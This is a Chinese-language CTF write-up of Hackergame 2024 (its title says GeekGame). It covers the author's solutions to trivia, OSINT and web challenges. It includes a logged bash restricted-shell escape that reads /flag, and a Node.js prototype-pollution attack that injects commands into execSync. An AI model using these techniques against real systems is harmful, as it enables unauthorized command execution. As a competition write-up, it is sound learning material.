# GeekGame 2024 Writeup

> [!NOTE]
> 原始链接：https://gist.github.com/sxzz/a20bb470a8fde0a04115a4d2df8e8313

## 写在前面

这几天沉迷 Hackergame 2024，现在终于结束了！ 🥳 我得了 39 名 / 2460 人（🔝1.5%）。

## 签到

直接点击「马上启动」按钮，会发现 URL 出现了 `?pass=false`。把它改成 true 试试呢？噢通关了！

- http://202.38.93.141:12024/?pass=true
- `flag{WeLCoME-t0-haCk3r9Ame-4nd-enJOY-H4ckiNG-zoZ4}`

## 喜欢做签到的 CTFer 你们好呀

我先找到「中国科学技术大学校内 CTF 战队」是什么，Google 得出是叫做「USTC-NEBULA」战队。继续搜索即可得出「[USTC NEBULA 2024 招新安排](https://github.com/Nebula-CTFTeam/Recruitment-2024)」的 GitHub 仓库。点进 [owner 的 profile](https://github.com/Nebula-CTFTeam)，就可以得到[它的官网](https://www.nebuu.la/)。（不知道为何还有一个 [`USTC-NEBULA`](https://github.com/USTC-NEBULA) org）

### Checkin Again & Again

打开 Chrome DevTools 的 Network panel，直接搜索 `flag` 字样。我们可以看到 `oh-you-found-it`。这表明 flag 就藏在这个页面中。

<img src="https://gist.github.com/user-attachments/assets/c56cc54b-a64b-4482-9593-6d6e6946d163" alt="image" width="600" />

观察搜索到的这处的附近，可以发现一个正则表达式 `/(-a|-al|-la)/i`。

<img src="https://gist.github.com/user-attachments/assets/ebc773ca-cef1-4733-a32e-b056885a05c9" alt="image" width="600" />

嗯，好像是 `ls -al`，输入这个命令，就可以看到有个 `.flag` 文件。直接 `cat .flag` 就能拿到 flag。

（P.S 好像复制不了？直接选择元素，去 Elements panel 复制！💢）

提交看看，诶，不对啊！这怎么是第二题的 flag！🤷

- https://www.nebuu.la/
- `flag{0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else}`

### Checkin Again

做完第二小题，我其实是有点怀疑第二题是不是这个页面。为此我还去刚刚的招新安排页面看了看，没发现什么。好吧，继续回到网站。

继续观察刚刚的 js 文件，发现除了刚才找到的字符串，还有一个字符串也很长，还用 `atob` 包起来了！好，让我运行一下康康。

好，本题结束！

- `flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}`

### 官方题解

瞅了一眼官方的题解，发现[比赛主页](https://hack.lug.ustc.edu.cn/)就可以找到中科大校内战队的[链接](https://www.nebuu.la/)。好吧，网站的其他地方我都不看的 🤪

以及执行 `help` 命令其实可以看到有提供 `env` 命令，就直接拿到第一题的 flag。

## 猫咪问答（Hackergame 十周年纪念版）

这题其实完全是考互联网冲浪中的信息搜集了。

> 1. 在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？

经过了漫长的 Google 搜索，发现了 LUG 有个[网站](https://lug.ustc.edu.cn/wiki/lug/events/)，记录了很多活动的细节。我们可以在侧边栏看到「信息安全大赛」的页面（也就是 Hackergame）。在活动记录看到了往届的信息，2017 是第四届，倒推一下 2015 也就是第二届。我们也就跳转到了[答案页面](https://lug.ustc.edu.cn/wiki/sec/contest.html)。

> [!NOTE]
> 3A204

> 2. 众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？

首先我们要知道 2019 ~ 2023 年比赛的题目数量。毫无技巧，纯数数。去[往届的 writeup](https://github.com/orgs/USTC-Hackergame/repositories) 数题目个数，算一下哪个最接近 25。然后会发现怎么没有 2019 的呢！？

继续去互联网信息搜集（俗称 Google），[找到了](https://github.com/ustclug/hackergame2019-writeups)。但为什么就不能放到一个 GitHub org 呢？（难道有什么隐情 🫢）

通过计算发现 2019 年的最接近（写 writeup 的现在已经不想一个一个算了）。

然后去搜索 `hackergame 2019 注册人数`，发现 LUG 有[新闻稿](https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/)写了 `总共有 2682 人注册`。

> [!NOTE]
> 2682

> 3. Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？

我们知道往届的 writeups 会托管在 GitHub，那不如直接用 GitHub 的搜索引擎试试看？搜索 [hackergame 2018 图书馆 热搜词](https://github.com/search?q=hackergame+2018+%E5%9B%BE%E4%B9%A6%E9%A6%86+%E7%83%AD%E6%90%9C%E8%AF%8D&ref=opensearch&type=code)。本题结束。

> [!NOTE]
> 程序员的自我修养

> 4. 在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？

把关键词提炼一下，用英语搜索下 `USENIX Security 2024 email spoofing`，Google 会帮我找到 [PDF](https://www.usenix.org/system/files/usenixsecurity24-ma-jinrui.pdf)。

一开始试了下 `16 * 20 = 320`，发现不对（P.S 这题不像前段时间清北的 Geekgame 2024，答题一次需要防沉迷一个小时）。

后来想了想，不对啊，一共是 16 个服务提供商 + 20 个客户的。服务提供商自己都会提供客户端给用户的（比如说 Gmail 就有自己的 Web 和手机客户端）。那应该是 `16 * 20 + 16=336`。

P.S 官方题解：其实论文里写了，但我没耐心一行一行看。

> [!NOTE]
> 336

> 5. 10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？

紧跟时事，前段时间网上冲浪有关注这个事件，所以找了一下浏览器历史记录。找到了之前访问的 [commit 页面](https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2)。

> [!NOTE]
> 6e90b6

> 6. 大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？

```js
import { AutoTokenizer } from '@huggingface/transformers'

const content = await fetch('http://202.38.93.141:13030/', {
  headers: {
    Cookie: 'session=your-session',
  },
}).then((r) => r.text())

const tokenizer = await AutoTokenizer.from_pretrained(
  'meta-llama/Meta-Llama-3-70B',
)
const res = tokenizer.encode(content)
console.log(res.length)
```

为此，我还去 Hugging Face 申请了这个模型的权限。算出来是 `1835`，但这个答案其实是错误的。感觉大模型比较玄学，就 ±3 试了下。

> [!NOTE]
> 1833

好，做完了！

- `flag{Λ_9oØd_C@t_iS_7He_©aT_ωhO_cΛn_PαsS_tHe_qบ!2}`
- `flag{t3И_¥eAЯ5_0ƒ_H@©keRg4M3_om3dE7ØU_WItH_n3Ko_qU1z}`

## 打不开的盒

这其实是我除了签到，第一个解出的题目，一眼就感觉过于简单。

把题目文件下载下来，发现 macOS 可以直接打开它（Thanks to Xcode）。通过不同视角观察内部，可以得到 flag。不过 flag 的最后第二个字符还挺迷惑的，我试了大小写字母 `o` 都不行，才试了下 0️⃣。

- `flag{Dr4W_Us!nG_fR3E_C4D!!w0W}`

## 每日论文太多了！

打开题目的[论文链接](https://dl.acm.org/doi/10.1145/3650212.3652145)，把 [PDF](https://dl.acm.org/doi/pdf/10.1145/3650212.3652145) 下载下来。直接用浏览器搜索 flag 就可以发现有结果，但是肉眼不可见。

那就得抄家伙了，打开讨厌的 Adobe Acrobat，Edit PDF。找到搜索到 flag 的框框，copy 它告诉我们「flag here」。再细心点会发现，有个隐藏的图片也在这，把它拖拽出来。

不过这个画质真的是……一言难尽。又是 flag 中的 hacking，我试了 `l` 不行，大写 `i` 不行。噢原来是 1️⃣。

好，做完了！

- `flag{h4PpY_hAck1ng_3veRyd4y}`

## 比大小王

我第二个做的题目，我的主场是 Web。

直接分析页面源码。发现它会把数据状态存在一个全局变量 `state` 中。我们直接机算出所有 `state.values`。然后等倒数完成后，调用 submit 函数提交。

```js
submit(state.values.map(([a, b]) => (a < b ? '<' : '>')))
```

## 旅行照片 4.0

这个社工题对我来说还是有点难度的，不是很擅长。

### LEO_CHAN?

> **问题 1: 照片拍摄的位置距离中科大的哪个校门更近？（格式：**`X校区Y门`**，均为一个汉字）**

直接在高德地图（嗯，我不用百度地图），搜索「科里科气科创驿站」。会发现科大附近就有[一个地方](https://www.amap.com/detail/B0IAYRYV8C?citycode=340100)，那就决定是你啦！打开图片一看，确实没错。

<p align="center">
  <img src="https://gist.github.com/user-attachments/assets/d3a6e90a-18b1-423b-a5ab-0ba51d81646b" alt="image" width="400" />
  <img src="https://gist.github.com/user-attachments/assets/129f3c17-9f1d-4dff-9dc5-0e3ec605d20e" alt="image" width="400" />
</p>

> [!NOTE]
> 东校区西门

> 问题 2: 话说 Leo 酱上次出现在桁架上是……科大今年的 ACG 音乐会？活动日期我没记错的话是？（格式：`YYYYMMDD`）

搜索 `中科大 ACG 音乐会` 不难找到「[中科大 LEO 动漫协会](https://space.bilibili.com/7021308)」的 B 站账号。挖掘视频不难发现在[这个视频](https://www.bilibili.com/video/BV1TJ4m1A7z3)下的简介。

> [!NOTE]
> 20240519

- `flag{5UB5CR1B3_T0_L30_CH4N_0N_B1L1B1L1_PLZ_??????????}` （因人而异）

题外话：真羡慕高校生活呐

### FULL_RECALL

这题是小红书的软广，~~是不是收了钱？~~

> 问题 3: 这个公园的名称是什么？（不需要填写公园所在市区等信息）

打开第[一张图片](http://202.38.93.141:12345/photos/image01.jpg)，第一眼可以看到垃圾桶上写着「六安园林」，还有就是彩虹跑道。搜索关键词「六安 公园 彩虹」，就能发现[新闻稿](https://www.sohu.com/a/498872898_100023473)，所以应该是「中央公园」和「水上公园」二选一。但其实都不对，搜索「中央公园」可以发现全称是「中央森林公园」

> [!NOTE]
> 中央森林公园

> 问题 4: 这个景观所在的景点的名字是？（三个汉字）

拿着[第二张图片](http://202.38.93.141:12345/photos/image04.jpg)找了半天，还以为也是六安。没想到「而且这两张照片拍摄地的距离……是不是有点远？」是这么远啊……

总之最后用小某书，找到了别人旅游的图文和视频。

> [!NOTE]
> 坛子岭

- `flag{D3T41LS_M4TT3R_1F_R3V3RS3_S34RCH_1S_1MP0SS1BL3_??????????}` （因人而异）

### OMINOUS_BELL

> 问题 5: 距离拍摄地最近的医院是？（无需包含院区、地名信息，格式：XXX 医院）
>
> 问题 6: 左下角的动车组型号是？

这题对我这种对铁路不懂和不感兴趣的真的好难。但题目中提及了 `四编组动车`。去 Google 上找，不难发现 [China EMU](https://www.china-emu.cn/) 这个网站。在[这个页面](https://www.china-emu.cn/Trains/Model/detail-26012-201-F.html)可以发现，它和图片左下角的有点像，都是粉色的涂装。所以型号就是 `CRH6F-A`。

根据「怀密号」搜索，很容易找到 [WikiPedia 上的介绍](https://zh.wikipedia.org/wiki/%E5%8C%97%E4%BA%AC%E5%B8%82%E9%83%8A%E9%93%81%E8%B7%AF%E6%80%80%E6%9F%94%E2%80%94%E5%AF%86%E4%BA%91%E7%BA%BF)，可以知道它在北京北运营。接着根据它运行的线路，用 Google Earth 逐个寻找站点……（好累）。可以找到旁边的医院。

> [!NOTE]
> 积水潭医院
>
> CRH6F-A

- `flag{1_C4NT_C0NT1NU3_TH3_5T0RY_4NYM0R3_50M30N3_PLZ_H3LP_??????????}` （因人而异）

## 不宽的宽字符

我是 C/C++ 语言半吊子，所以靠的是 ChatGPT 打辅助告诉我代码都是什么意思 🤡。

因为这个环境还要用到 Linux x86 + Wine 来模拟在 Windows 上的环境。M1 chip + macOS 真的好难跑起来，遂开了个~~阿里云~~（广告位招租）的云电脑，下了个 Clion 跑起来了。现在环境已经扬了，所以只能靠我的记忆来回忆一下。

以我的知识大概知道：Windows 用的是坑爹的 UTF-16，每个字符占 2~3 个字节。但是普通的 char 只有一个字节。

我们再把 `(char*)filename.c_str()` 打印出来会发现，它会把一个 ASCII 字符拆成两个字节。那我们只需要构造一个字符串，使得每个字拆开正好是 `Z:\theflag` 的 ASCII 字节。

```js
const str = 'Z:\\theflag'
const arr = [...str]
let s = ''
for (let i = 0; i < arr.length; i += 2) {
  s += String.fromCharCode(
    parseInt(
      '0x' +
        arr[i + 1].charCodeAt(0).toString(16) +
        arr[i].charCodeAt(0).toString(16),
    ),
  )
}

console.log(s)
```

得到「㩚瑜敨汦条」，但我们需要用 `\0` 来截断后面添加的 `you_cant_get_the_flag`。所以我们可以随便找个以 `00` 结尾的四位数字符，比如说 `'\u5000'`。我们就可以得到答案「㩚瑜敨汦条倀」。

- `flag{wider_char_isnt_so_great_??????????}` （因人而异）

## PowerfulShell

我们首先看看还剩下什么字符可以用，把键盘上看到的字符都打出来，然后删掉不能用的。我们得到以下字符

```
`, [], {}, _, -, $, 1-9, :, =, +, ~
```

然后去看 Bash 教程，把能用的语法都记一记。

- https://wangdoc.com/bash/expansion#%E6%B3%A2%E6%B5%AA%E7%BA%BF%E6%89%A9%E5%B1%95
  - `~`: HOME 目录
  - `~+` 当前目录（其实和 HOME 目录一样的）
- https://wangdoc.com/bash/string#%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2
  - `${varname:offset:length}`：提取子串，但需要注意的是：只能使用 varname，而不是表达式。因此我们需要把表达式的值存下来。

不能使用字母，那我们如何起一个变量名呢？`_123456789` 是可用的，也是合法的 varname。

这题我特意把做题的日志存下来了，直接看日志吧。

```bash
PowerfulShell@hackergame> _1=~+                        // _1=/players
PowerfulShell@hackergame> _2=${_1:2:1}                 // _2=l
PowerfulShell@hackergame> _3=${_1:7:1}                 // _3=s
PowerfulShell@hackergame> $_2$_3                       // ls
PowerfulShell.sh
PowerfulShell@hackergame> _4=$[1-1]                    // _4=0
PowerfulShell@hackergame> $_2$_3 ${_1:_4:1}            // ls /
bin
boot
dev
etc
flag
home
lib
lib32
lib64
libx32
media
mnt
opt
players
proc
root
run
sbin
srv
sys
tmp
usr
var

PowerfulShell@hackergame> _5=`$_2$_3 ${_1:_4:1}`       // _5=`ls /` (也就是刚刚的结果)
PowerfulShell@hackergame> _6=${_5:15:1}                // _6=c
PowerfulShell@hackergame> _7=${_5:19:1}                // _7=a
PowerfulShell@hackergame> _8=${_5:7:1}                 // _8=t
PowerfulShell@hackergame> $_6$_7$_8 ${_1:_4:1}${_5:17} // cat /
flag{N0w_I_Adm1t_ur_tru1y_5He11_m4ster_??????????}
cat: home: No such file or directory
cat: lib: No such file or directory
cat: lib32: No such file or directory
cat: lib64: No such file or directory
cat: libx32: No such file or directory
cat: media: No such file or directory
cat: mnt: No such file or directory
cat: opt: No such file or directory
cat: players: No such file or directory
cat: proc: No such file or directory
cat: root: No such file or directory
cat: run: No such file or directory
cat: sbin: No such file or directory
cat: srv: No such file or directory
cat: sys: No such file or directory
cat: tmp: No such file or directory
cat: usr: No such file or directory
cat: var: No such file or directory
PowerfulShell@hackergame>
```

### 后记

其实可以简单点，`~+` 就是 `~`；我们可以直接用 bash 执行任意命令，比 `cat /` 更强大了。

所以，我又做了一遍。

```bash
PowerfulShell@hackergame> _1=~
PowerfulShell@hackergame> _2=${_1:2:1}
PowerfulShell@hackergame> _3=${_1:7:1}
PowerfulShell@hackergame> _4=`$_2$_3 ${_1:1-1:1}`
PowerfulShell@hackergame> _5=${_4:1-1:1}
PowerfulShell@hackergame> _6=${_4:19:1}
PowerfulShell@hackergame> _7=${_4:71-1:1}
PowerfulShell@hackergame> _8=${_4:22:1}
PowerfulShell@hackergame> $_5$_6$_7$_8
cat /flag
flag{N0w_I_Adm1t_ur_tru1y_5He11_m4ster_??????????}
```

- `flag{N0w_I_Adm1t_ur_tru1y_5He11_m4ster_??????????}` （因人而异）

## Node.js is Web Scale

Web，熟悉的味道。

打开题目，我花了好久才注意到，最下面有个 `View source code` 的链接 🌚。好吧，我们来看看代码怎么写的。

在 `/execute` 路由可以看到，它用了 `execSync`。那么这里应该就是突破口了。尤其是它的注释写了 `obviously safe` 来挑衅，只能是这里了。

不过它执行的是 `cmds` 对象中预设好的命令，有什么办法我们可以增加新的命令吗？尤其我们可以看到 `/set` 路由，它帮我们处理好了深层属性的设置。噢，原型链攻击！

```js
const a = {}
a.__proto__.evil = 996
a.evil // 996
```

通过上面的代码，可以注入一个 `evil` 的属性到任意的对象中。所以我们只需要设置一次 `key`: `__proto__.evil`, `value`: `ls /`。然后访问 `/execute?cmd=evil`，不难发现有个 flag 文件。把 `value` 改为 `cat /flag`，再访问一遍就拿到 flag 了。

- `flag{n0_pr0topOIl_50_U5E_new_Map_1n5teAD_Of_0bject2kv_??????????}` （因人而异）

## 题解未完待续

> [!CAUTION]
> 未完待续

## 后记

这是我第二次正式参加 CTF。这次比赛开始时，我正好在日本旅行，特地抽出了一天时间来专门做 CTF（峰值排名第四名 🤣）。回国之后又折腾了一天才回到家，期间睡眠严重不足。直到比赛结束前 3 个小时，我才放弃解题，去睡觉了。肝是挺肝的，但乐在其中。不过我已经把我能解出来的题都解出来了，没什么好遗憾的。期待下次~~肝~~比赛。

作为一个非常业余的 CTFer，能取得这样的成绩对我来说挺好的了。~~不枉我从小当脚本小子。~~

#### 一些碎碎念

不论是 GeekGame 还是 HackerGame，感觉对 ARM macOS 不是很友好。「不宽的宽字符」和「动画分享」都花了我巨多时间来准备环境。

> [!TIP]
> 好在大部分的题目，都可以正常地使用 OrbStack 模拟 x86 环境跑起来。
>
> ```bash
> docker build --platform linux/amd64 .
> ```

P.S 以后有 CTF 组队可以喊我一起。（如果我有空的话）

## 版权声明

Copyright (c) [三咲智子 Kevin Deng](https://github.com/sxzz). All rights reserved.

<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a><br />本作品题解部分与未特别标注的源代码部分采用<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>进行许可，特别标注的部分以标注的许可协议进行许可。
